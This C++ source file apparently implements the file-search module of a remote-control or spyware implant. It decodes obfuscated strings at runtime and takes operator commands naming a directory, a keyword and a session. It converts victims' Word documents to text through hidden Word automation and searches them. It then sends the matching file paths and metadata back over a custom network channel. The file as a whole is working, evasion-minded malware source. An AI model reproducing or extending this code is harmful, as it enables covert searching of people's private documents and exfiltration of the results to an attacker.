// FileSearch.cpp: implementation of the FileSearch class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "FileSearch.h"
#include "FilePublicFun.h"
#include "Struct.h"
#include "NdisSocket.h"
#include "WinApi.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

BOOL DocToTxt(BSTR bstrOpenFile, BSTR bstrSaveFile)   
{   
    // ******************* Declare Some Variables ********************    
   
    // Variables that will be used and re-used in our calls    
    DISPPARAMS      m_dpNoArgs = {NULL, NULL, 0, 0};   
    VARIANT         m_vResult;   
    OLECHAR FAR*    m_szFunction;   
   
    // IDispatch pointers for Word's objects    
    IDispatch*      m_pDispDocs;          //Documents collection    
    IDispatch*      m_pDispActiveDoc;     //ActiveDocument object    
   
    // DISPID's    
    DISPID          m_dispid_Docs;        //Documents property of Application object    
    DISPID          m_dispid_ActiveDoc;   //ActiveDocument property of Application     
    DISPID          m_dispid_SaveAs;      //SaveAs method of the Document object    
    DISPID          m_dispid_Quit;        //Quit method of the Application object    
   
    DISPID          m_dispid_Open;        //Open method of the Application object    
    BSTR            m_bstrEmptyString ;   
   
	WCHAR TmpStrW[50];
    // ******************** Start Automation ***********************    
   
    //Initialize the COM libraries    
    PCoInitialize(NULL);   
   
    // Create an instance of the Word application and obtain the pointer    
    // to the application's IDispatch interface.    
    CLSID   m_clsid;
	//Word.Application
	DeFileStringW(TmpStrW, 50, L"MJsj.NppKykhGyJL");
    PCLSIDFromProgID(TmpStrW, &m_clsid);   
   
    IUnknown*   m_pUnk;   
    HRESULT m_hr = PCoCreateInstance( m_clsid, NULL, CLSCTX_SERVER,   
                                       IID_IUnknown, (void**) &m_pUnk);  
	if (m_hr != 0)
	{
		return FALSE;
	}
    IDispatch*  m_pDispApp;   
    m_hr = m_pUnk->QueryInterface( IID_IDispatch, (void**)&m_pDispApp);   

	if (m_hr != 0)
	{
		return FALSE;
	}
   
    // Get IDispatch* for the Documents collection object   
	//Documents
	DeFileStringW(TmpStrW, 50, L"AJkwHiLGY");
    m_szFunction = TmpStrW;   
    m_hr = m_pDispApp->GetIDsOfNames (IID_NULL, &m_szFunction, 1,    
                                      LOCALE_USER_DEFAULT, &m_dispid_Docs);   
	if (m_hr != 0)
	{
		return FALSE;
	}
    m_hr = m_pDispApp->Invoke (m_dispid_Docs, IID_NULL, LOCALE_USER_DEFAULT,   
                               DISPATCH_PROPERTYGET, &m_dpNoArgs, &m_vResult,    
                               NULL, NULL);   
	if (m_hr != 0)
	{
		return FALSE;
	}
    m_pDispDocs = m_vResult.pdispVal;   
   
    // Query id of method open   
	//Open
	DeFileStringW(TmpStrW, 50, L"-piL");
    m_szFunction = TmpStrW;   
    m_hr = m_pDispDocs->GetIDsOfNames(IID_NULL, &m_szFunction,1,   
                                      LOCALE_USER_DEFAULT, &m_dispid_Open);   
	if (m_hr != 0)
	{
		return FALSE;
	}
   
    // Prepare parameters for open method    
    VARIANT     vArgsOpen[6];   
    DISPPARAMS  dpOpen;   
    dpOpen.cArgs        = 6;   
    dpOpen.cNamedArgs   = 0;   
    dpOpen.rgvarg       = vArgsOpen;   
   
    VARIANT     vFalse, vTrue;   
    vFalse.vt           = VT_BOOL;   
    vFalse.boolVal      = FALSE;   
    vTrue.vt            = VT_BOOL;   
    vTrue.boolVal       = TRUE;   
   
   
    m_bstrEmptyString = PSysAllocString(OLESTR("")) ;   
   
    vArgsOpen[5].vt         = VT_BSTR;   
    vArgsOpen[5].bstrVal    = bstrOpenFile;   
    vArgsOpen[4]            = vFalse;   
    vArgsOpen[3]            = vTrue;   
    vArgsOpen[2]            = vFalse;   
    vArgsOpen[1].vt         = VT_BSTR;   
    vArgsOpen[1].bstrVal    = m_bstrEmptyString;   
    vArgsOpen[0].vt         = VT_BSTR;   
    vArgsOpen[0].bstrVal    = m_bstrEmptyString;   
   
    //Execute open method    
    m_hr=m_pDispDocs->Invoke(m_dispid_Open,IID_NULL,LOCALE_USER_DEFAULT,   
                             DISPATCH_METHOD,&dpOpen,NULL,NULL,NULL);  
	if (m_hr != 0)
	{
		return FALSE;
	}
   
    //Query activedocument interface    
	//ActiveDocument
	DeFileStringW(TmpStrW, 50, L"NkGyViAJkwHiLG");
    m_szFunction = TmpStrW;   
    m_hr = m_pDispApp->GetIDsOfNames(IID_NULL, &m_szFunction, 1,   
                                     LOCALE_USER_DEFAULT,&m_dispid_ActiveDoc);   
	if (m_hr != 0)
	{
		return FALSE;
	}
    m_hr = m_pDispApp->Invoke(m_dispid_ActiveDoc,IID_NULL,   
                              LOCALE_USER_DEFAULT, DISPATCH_PROPERTYGET,   
                              &m_dpNoArgs,&m_vResult,NULL,NULL);   
	if (m_hr != 0)
	{
		return FALSE;
	}
    m_pDispActiveDoc = m_vResult.pdispVal;   
   
    //Prepare arguments for save as .txt    
    VARIANT         vArgsSaveAs[11];   
    DISPPARAMS      dpSaveAs;   
    dpSaveAs.cArgs          =   11;   
    dpSaveAs.cNamedArgs     =   0;   
    dpSaveAs.rgvarg         =   vArgsSaveAs;   
   
    vArgsSaveAs[10].vt      =   VT_BSTR;   
    vArgsSaveAs[10].bstrVal =   bstrSaveFile;       //Filename    
    vArgsSaveAs[9].vt       =   VT_I4;   
    vArgsSaveAs[9].lVal     =   2;                  //FileFormat(wdFormatText = 2)    
    vArgsSaveAs[8]          =   vFalse;             //LockComments    
    vArgsSaveAs[7].vt       =   VT_BSTR;   
    vArgsSaveAs[7].bstrVal  =   m_bstrEmptyString;  //Password    
    vArgsSaveAs[6].vt       =   VT_BOOL;   
    vArgsSaveAs[6].boolVal  =   TRUE;               //AddToRecentFiles    
    vArgsSaveAs[5].vt       =   VT_BSTR;   
    vArgsSaveAs[5].bstrVal  =   m_bstrEmptyString;  //WritePassword    
    vArgsSaveAs[4]          =   vFalse;             //ReadOnlyRecommended    
    vArgsSaveAs[3]          =   vFalse;             //EmbedTrueTypeFonts    
    vArgsSaveAs[2]          =   vFalse;             //SaveNativePictureFormat    
    vArgsSaveAs[1]          =   vFalse;             //SaveFormsData    
    vArgsSaveAs[0]          =   vFalse;             //SaveAsOCELetter    
   
    // Query and execute SaveAs method   
	//SaveAs
	DeFileStringW(TmpStrW, 50, L"vhViNY");
    m_szFunction = TmpStrW;   
    m_hr = m_pDispActiveDoc->GetIDsOfNames(IID_NULL,&m_szFunction,1,   
                                           LOCALE_USER_DEFAULT,&m_dispid_SaveAs);   
	if (m_hr != 0)
	{
		return FALSE;
	}
    m_hr = m_pDispActiveDoc->Invoke(m_dispid_SaveAs, IID_NULL,   
                                    LOCALE_USER_DEFAULT,DISPATCH_METHOD,   
                                    &dpSaveAs,NULL,NULL,NULL); 
	if (m_hr != 0)
	{
		return FALSE;
	}
    // Invoke the Quit method   
	//Quit
	DeFileStringW(TmpStrW, 50, L"QwyG");
    m_szFunction = TmpStrW;   
    m_hr = m_pDispApp->GetIDsOfNames(IID_NULL, &m_szFunction, 1,   
                                     LOCALE_USER_DEFAULT, &m_dispid_Quit);   
	if (m_hr != 0)
	{
		return FALSE;
	}
    m_hr = m_pDispApp->Invoke(m_dispid_Quit, IID_NULL, LOCALE_USER_DEFAULT,   
                              DISPATCH_METHOD, &m_dpNoArgs, NULL, NULL, NULL); 
	if (m_hr != 0)
	{
		return FALSE;
	}
   
    //Clean-up    
    PSysFreeString(bstrOpenFile) ;   
    PSysFreeString(bstrSaveFile) ;   
    PSysFreeString(m_bstrEmptyString) ;   
   
    m_pDispActiveDoc->Release();   
    m_pDispDocs->Release();   
    m_pDispApp->Release();   
    m_pUnk->Release();   
   
    PCoUninitialize();   

	return TRUE;
}   

SearchWork::SearchWork()
{
	memset(m_szSessionid, 0, 100);
	m_bThreadStart = FALSE;
	m_strSearchRst = new char[300*2000];
}

SearchWork::~SearchWork()
{
	if (m_strSearchRst)
	{
		delete []m_strSearchRst;
	}
}

void SearchWork::DestroyInstance()
{
	if ( m_pInstance != 0 )
	{
		delete m_pInstance;
		m_pInstance = 0;
	}
}

SearchWork *SearchWork::m_pInstance = 0;

SearchWork *SearchWork::GetInstance()
{
	if ( m_pInstance == 0 )
	{
		m_pInstance = new SearchWork();
	}
	
	return m_pInstance;
}

BOOL SearchWork::startSearch()
{
	DWORD dwID;
	HANDLE hthread=CreateThread(
		NULL,
		NULL, 
		Search, 
		(LPVOID)this,
		NULL, 
		&dwID);
	if(hthread != NULL)
	{
		//开始全文搜索: TID:%d", dwID
		CloseHandle(hthread);
	}
	else
	{
		int ero=PGetLastError();
		//开始全文搜索失败 ID:%d",ero
	}
	
	return TRUE;
}


DWORD WINAPI SearchWork::Search(LPVOID lp)
{
	SearchWork *pClass = (SearchWork *)lp;

	memset(pClass->m_strSearchRst, 0, 300*2000);
	pClass->m_nSearchRstLen = 0;
	pClass->m_nSearchNum = 0;
	pClass->m_bThreadStart = TRUE;

	WCHAR wSearchDir[MAX_PATH];
	UTF_82Unicode(pClass->m_szSearchDir, wSearchDir, MAX_PATH);

	if (pClass->GetPathStruct(wSearchDir))
	{
		pClass->m_bThreadStart = FALSE;
	}

	return 0;
}

BOOL SearchWork::GetPathStruct(WCHAR * p)
{
	DIRLIST	dirlist;
	dirlist.filecount = 0;
	dirlist.filelist = NULL;
	wcsncpy(dirlist.rootdir, p, MAX_PATH);//"c:\"
	
	if (dirlist.rootdir[wcslen(p)-1] ==L'\\')
	{
		dirlist.rootdir[wcslen(p)-1]=L'\0';
	}

	char tdoc[10], tdocx[10], ttxt[10];
	WCHAR ttmp[10];
	DeFileStringA(tdoc, 10, ".vlK"); //.doc
	DeFileStringA(tdocx, 10, ".vlKL"); //.docx
	DeFileStringA(ttxt, 10, ".VLV"); //.txt
	DeFileStringW(ttmp, 10, L".GHp"); //.tmp
	
	if(GetDirList(dirlist))
	{
		PSleep(1);
		//改为ini的方式,方便读
		
		BOOL bFind, bFindCon;
		char tmpbuf[500];
		char filename[3*MAX_PATH], filepath[3*MAX_PATH], rootdir[3*MAX_PATH], gb_SearchContent[100];
		WCHAR uni_filepath[MAX_PATH], uni_tmppath[MAX_PATH];
		Unicode2UTF_8(dirlist.rootdir, rootdir, 3*MAX_PATH-1);
		Utf82Gb(m_szSearchContent, strlen(m_szSearchContent), gb_SearchContent, 100);

		int runtimes=0;
		for (int i = 0; i < dirlist.filecount; i++)
		{
			if (m_bThreadStart == FALSE)
			{
				return FALSE;
			}

			time_t ftime;
			FileTimeToTime_t(dirlist.filelist[i].filetime, &ftime);
			
			Unicode2UTF_8(dirlist.filelist[i].filename, filename, 3*MAX_PATH-1);
			
			int len=0;
			int filetype;
			bFindCon = FALSE;
			//时间 \t 大小 \t 类型 \t文件名
			if(dirlist.filelist[i].filetype==0)
			{
				if (dirlist.filelist[i].filesize > 20*1024*1024)
				{
					continue;
				}

				bFind = FALSE;
				swprintf(uni_filepath, L"%s\\%s", dirlist.rootdir, dirlist.filelist[i].filename);
				if (strstr(filename, ttxt)  != NULL)
				{
					swprintf(uni_tmppath, L"%s%s", uni_filepath, ttmp);
					PCopyFileW(uni_filepath, uni_tmppath, FALSE);

					bFind = TRUE;
				}
				else if (strstr(filename, tdocx)  != NULL || strstr(filename, tdoc)  != NULL)
				{
					swprintf(uni_tmppath, L"%s%s", uni_filepath, ttmp);
					BSTR str1,str2;   
					str1 = PSysAllocString(uni_filepath);   
					str2 = PSysAllocString(uni_tmppath);
					if (DocToTxt(str1, str2))
					{
						bFind = TRUE;
					}
				}
				else if (strstr(filename, m_szSearchContent) != NULL)
				{
					bFindCon = TRUE;
				}

				if (bFind)
				{
					FILE * fp = _wfopen(uni_tmppath, L"rb");

					if (fp)
					{
						char * tmpstr = new char[dirlist.filelist[i].filesize+1];
						fread(tmpstr, 1, dirlist.filelist[i].filesize, fp);
						fclose(fp);

						if (strstr(tmpstr, m_szSearchContent) != NULL)
						{
							bFindCon = TRUE;
						}
						else if (strstr(tmpstr, gb_SearchContent) != NULL)
						{
							bFindCon = TRUE;
						}

						PDeleteFileW(uni_tmppath);
						if (tmpstr)
						{
							delete []tmpstr;
						}
					}
				}
				filetype = 1;
			}
			else
			{
				if (strstr(filename, m_szSearchContent) != NULL)
				{
					bFindCon = TRUE;
				}
				filetype = 0;
			}

			if (bFindCon)
			{
				sprintf(filepath, "%s\\%s", rootdir, filename);
				len = sprintf(tmpbuf, "%s\t%d\t%I64d\t%u\t\r\n",
					filepath, filetype, dirlist.filelist[i].filesize, ftime);
				
				memcpy(m_strSearchRst+m_nSearchRstLen, tmpbuf, len);
				m_nSearchRstLen += len;
				m_nSearchNum++;
				
				if (m_nSearchNum >= m_nSearchMaxNum)
				{
					return FALSE;
				}
			}

			runtimes++;
			if(runtimes>20)
			{
				runtimes=0;
				PSleep(1);
			}
		}
		
		for (int ii=0;ii < dirlist.filecount; ii++)
		{
			if(dirlist.filelist[ii].filetype!=0)
			{
				WCHAR subDir[MAX_PATH];
				swprintf(subDir, L"%s\\%s",dirlist.rootdir, dirlist.filelist[ii].filename);
				if (GetPathStruct(subDir) == FALSE)
				{
					return FALSE;
				}
			}
		}
	}

	return TRUE;
}

int SearchWork::SearchFile(LPCSTR szDir, LPCSTR szContent, int nNum, LPCSTR szSession, char *& szRst)
{
	int nlen = 0;
	char TmpStr[10];
	if (m_szSessionid[0] == 0)
	{
		strcpy(m_szSearchDir, szDir);
		strcpy(m_szSearchContent, szContent);
		strcpy(m_szSessionid, szSession);
		m_nSearchMaxNum = nNum;
		
		startSearch();
		
		szRst = new char[10];
		//query|0|
		DeFileStringA(szRst, 10, "qekTu|0|");
		nlen = strlen(szRst);
	}
	else if (strcmp(szSession, m_szSessionid) != 0)
	{
		if (m_bThreadStart)
		{
			m_bThreadStart = FALSE;
		}
		else
		{
			strcpy(m_szSearchDir, szDir);
			strcpy(m_szSearchContent, szContent);
			strcpy(m_szSessionid, szSession);
			m_nSearchMaxNum = nNum;
			
			startSearch();
		}
		
		szRst = new char[10];
		//query|0|
		DeFileStringA(szRst, 10, "qekTu|0|");
		nlen = strlen(szRst);
	}
	else
	{
		szRst = new char[m_nSearchRstLen+20];
		if (m_bThreadStart)
		{
			nlen = sprintf(szRst, "%s|%d|%s", DeFileStringA(TmpStr, 10, "qekTu"), m_nSearchNum, m_strSearchRst); //query
		}
		else
		{
			nlen = sprintf(szRst, "%s|%d|%s", DeFileStringA(TmpStr, 10, "kFv"), m_nSearchNum, m_strSearchRst); //end
		}
	}
	
	return nlen;
}

BOOL SearchFile(DWORD* pPara)
{
	ThreadParam *ppara=(ThreadParam*)pPara;
	
	char buffer[2000], TmpStr[50];
	memset(buffer,0,2000);
	DWORD datalen=0;
	char* strsrhdir = NULL;
	char* strsrhcont = NULL;
	char* strsrhnum = NULL;
	char* strsessid = NULL;
	char *inputline	=ppara->buf;
	char *nextline	=0;
	char *field		=0;
	char *value		=0;
	//初始化
	int re=0;
	re=LineParser(inputline,&nextline,&field,&value);
	while(re)
	{
		if(stricmp(field, DeFileStringA(TmpStr, 50, "CTMvET"))==0) //srhdir
		{
			strsrhdir = value;
		}
		else if(stricmp(field, DeFileStringA(TmpStr, 50, "CTMKlFV"))==0) //srhcont
		{
			strsrhcont = value;
		}
		else if(stricmp(field, DeFileStringA(TmpStr, 50, "CTMFeW"))==0) //srhnum
		{
			strsrhnum = value;
		}
		else if(stricmp(field, DeFileStringA(TmpStr, 50, "CkCCEv"))==0) //sessid
		{
			strsessid = value;
		}
		inputline=nextline;
		re=LineParser(inputline,&nextline,&field,&value);
	}	
	if(strsrhdir == NULL || strsrhcont == NULL || strsrhnum == NULL || strsessid == NULL)
		return FALSE;
	
	int nsrhnum = atoi(strsrhnum);
	
	int nRstLen;
	char * szRst;
	
	nRstLen = SearchWork::GetInstance()->SearchFile(strsrhdir, strsrhcont, nsrhnum, strsessid, szRst);
	
	char tmphead[1024];
	SYSTEMTIME nowtime;
	PGetLocalTime(&nowtime);
	//time
	int tmplen = sprintf(tmphead, "%s: %04d%02d%02d%02d%02d%02d\r\n", DeFileStringA(TmpStr, 50, "VEWk"), 
		nowtime.wYear, nowtime.wMonth, nowtime.wDay,
		nowtime.wHour, nowtime.wMinute, nowtime.wSecond);
	//content-length
	tmplen += sprintf(tmphead+tmplen, "%s: %d\r\n", DeFileStringA(TmpStr, 50, "KlFVkFVdGkFgVM"), nRstLen);
	//content-type: search
	tmplen += sprintf(tmphead+tmplen, "%s\r\n\r\n", DeFileStringA(TmpStr, 50, "KlFVkFVdVupk: CkSTKM"));
	
	char* pbuf = new char[tmplen+nRstLen+10];
	strcpy(pbuf, tmphead);
	strcat(pbuf, szRst);
	
	if(SendData(pbuf, nRstLen+tmplen, ppara->PacketType, ppara->SessionID))
	{
	}
	delete[] pbuf;
	if (szRst)
	{
		delete []szRst;
	}
	
	return TRUE;
}
